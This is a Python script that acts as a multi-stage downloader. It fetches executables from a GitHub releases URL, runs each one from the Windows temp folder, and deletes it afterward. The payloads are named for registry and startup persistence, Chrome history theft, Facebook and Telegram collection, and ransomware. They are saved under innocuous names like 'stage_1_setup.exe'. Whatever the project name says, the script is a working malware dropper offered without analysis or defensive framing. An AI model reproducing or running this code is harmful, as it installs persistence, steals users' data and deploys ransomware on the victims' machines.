import os
import subprocess
import urllib.request
import sys

def download_and_execute_program(url: str, output_filename: str) -> int:
    """
    Downloads a standard Windows executable to the system temporary directory,
    executes it via the OS Loader, tracks its execution, and returns the exit status code.
    
    :param url: The raw direct download URL of the target .exe binary.
    :param output_filename: The temporary name to assign to the file locally.
    :return: An integer representing the program's exit status code. Returns -1 if download/execution fails.
    """
    temp_dir = os.environ.get("TEMP", os.environ.get("TMP", "C:\\Windows\\Temp"))
    local_execution_path = os.path.join(temp_dir, output_filename)
    
    print(f"\n--- Starting Task: {output_filename} ---")
    print(f"[*] Target path: {local_execution_path}")
    print(f"[*] Downloading from: {url}")
    
    # 1. Download the binary safely to disk
    try:
        req = urllib.request.Request(
            url, 
            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        )
        with urllib.request.urlopen(req) as response, open(local_execution_path, 'wb') as out_file:
            out_file.write(response.read())
        print("[+] Binary completely downloaded to disk storage.")
    except Exception as e:
        print(f"[-] Critical Error during file transfer: {e}")
        return -1

    # 2. Execute via the OS Loader and handle exit streams
    print("[*] Handing process initialization over to Windows Loader...")
    try:
        # subprocess.run blocks the main thread here until the child program exits completely
        completed_process = subprocess.run(
            [local_execution_path], 
            capture_output=False, 
            text=True,
            check=False # Prevents Python from throwing an unhandled exception if exit status is non-zero
        )
        
        exit_status = completed_process.returncode
        print(f"[+] Program execution finished with exit status code: {exit_status}")
        return exit_status

    except Exception as run_err:
        print(f"[-] Failed to execute the binary cleanly: {run_err}")
        return -1
        
    finally:
        # 3. Clean up the temporary executable file after execution
        try:
            if os.path.exists(local_execution_path):
                os.remove(local_execution_path)
                print("[*] Temporary execution file wiped from disk.")
        except Exception as clean_err:
            print(f"[!] Warning: Could not clean up file immediately: {clean_err}")


# ==============================================================================
# MULTI-PROGRAM PIPELINE MANAGEMENT
# ==============================================================================
if __name__ == "__main__":
    # Define your list of programs here in the exact order you want them to run
    program_pipeline = [
	{
            "url": "https://github.com/monouk-prog/Cyber-Proj-ANTI-MALICIOUS/releases/latest/download/addtoregistrykey.exe",
            "filename": "stage_1_setup.exe"
        },
	{
            "url": "https://github.com/monouk-prog/Cyber-Proj-ANTI-MALICIOUS/releases/latest/download/addtostartup.exe",
            "filename": "stage_1_setup.exe"
        },
        {
            "url": "https://github.com/monouk-prog/Cyber-Proj-ANTI-MALICIOUS/releases/latest/download/gethistoryChrome.exe",
            "filename": "stage_1_setup.exe"
        },
        {
            "url": "https://github.com/monouk-prog/Cyber-Proj-ANTI-MALICIOUS/releases/latest/download/facebookrun.exe", 
            "filename": "stage_2_config.exe"
        },
        {
            "url": "https://github.com/monouk-prog/Cyber-Proj-ANTI-MALICIOUS/releases/latest/download/Telegramrun.exe",
            "filename": "stage_3_cleanup.exe"
        },
	{
            "url": "https://github.com/monouk-prog/Cyber-Proj-ANTI-MALICIOUS/releases/latest/download/ransomware.exe",
            "filename": "stage_3_cleanup.exe"
        }
    ]
    
    print(f"[*] Pipeline initialized. Total programs to execute: {len(program_pipeline)}")
    
    # Iterate through each program sequentially
    for index, program in enumerate(program_pipeline, start=1):
        print(f"\n[Sequence {index}/{len(program_pipeline)}]")
        
        status_code = download_and_execute_program(program["url"], program["filename"])
        
        # Check exit status before continuing to the next iteration
        if status_code == 0:
            print(f"[SUCCESS] {program['filename']} finished cleanly. Proceeding to next step...")
            continue
        elif status_code == -1:
            print(f"\n[CRITICAL FAILURE] {program['filename']} failed to download or initialize.")
            print("[!] Halting execution pipeline immediately to prevent system inconsistencies.")
            sys.exit(1)
        else:
            print(f"\n[WARNING] {program['filename']} exited with an error status: {status_code}.")
            print("[!] Stopping pipeline sequence due to a non-zero exit code.")
            sys.exit(status_code)
            
    print("\n==================================================")
    print("[+] ALL AUTOMATION TASKS COMPLETED SUCCESSFULLY!")
    print("==================================================")